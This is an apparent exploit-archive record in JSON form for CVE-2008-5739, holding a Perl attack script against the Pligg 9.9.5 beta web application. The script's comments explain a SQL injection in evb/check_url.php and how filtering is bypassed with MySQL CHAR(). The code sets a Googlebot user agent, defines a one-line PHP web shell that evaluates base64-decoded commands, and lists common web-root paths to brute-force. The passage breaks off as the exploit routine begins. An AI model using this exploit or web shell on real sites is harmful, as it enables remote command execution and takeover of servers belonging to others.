{
    "text": "ecve : CVE-2008-5739 ， title : Pligg 9.9.5b - Arbitrary File Upload / SQL Injection - PHP webapps Exploit ， verified : Verified ， exploit_detail :  #  ! /usr/bin/perl ， =about ， Pligg 9.9.5 Beta Perl exploit ， AUTHOR ， discovered & written by Ams ， ax330d [ doggy ] gmail [ dot ] com ， VULN. DESCRIPTION :  ， Vulnerability hides in 'evb/check_url.php' ， unfiltered $ _GET [ 'url' ] parameter. ， Actually , it has filtration. ， Filtration strips tags and converts html ， special chars , but it is not enough ,  ， because we can use MySQLs CHAR (  ) function ， to convert shell to allowed chars. ， EXPLOIT WORK :  ， Firtsly , exploit tryes to get full server ， path , but if not succeeded , then it will brute it. ， If path has been found then exploit will try ， to upload tiny shell via SQl-Injection. ， REQUIREMENTS :  ， MySQL should be able to write to file. ， Know full server path to portal. ， magiq_quotes_gpc=off ， =cut ， use strict ;  ， use warnings ;  ， use LWP :  : UserAgent ;  ， use HTTP :  : Request :  : Common ;  ， Banner (  )  ;  ，  $  | = 1 ;  ， my $ expl_url = shift or Usage (  )  ;  ， my $ serv_path = shift |  | '' ;  ， my $ spider = LWP :  : UserAgent->new ;  ，  $ spider->timeout ( 9 )  ;  ，  $ spider->agent ( 'Mozilla/5.0 ( compatible ; Googlebot/2.1 ; + ， my $ def_shell = '/libs/manager.php' ;  ， my $ shell = q ( <?php @ eval ( base64_decode (  $ _GET [ 'cmd' ]  )  )  ; ?> )  ;  ， my $ sql_shell = join ' , ' , map { ord } split // ,  $ shell ;  ， my @ paths = qw (  ， /var/www/htdocs /var/www/localhost/htdocs /var/www /var/wwww/hosting /var/www/html /var/www/vhosts ， /home/www /home/httpd/vhosts ， /usr/local/apache/htdocs ， /www/htdocs ，  )  ;  ， exploit (  $ expl_url )  ;  ， sub exploit { ，  $ _ = shift ; ",
    "time": "2008-12-22"
}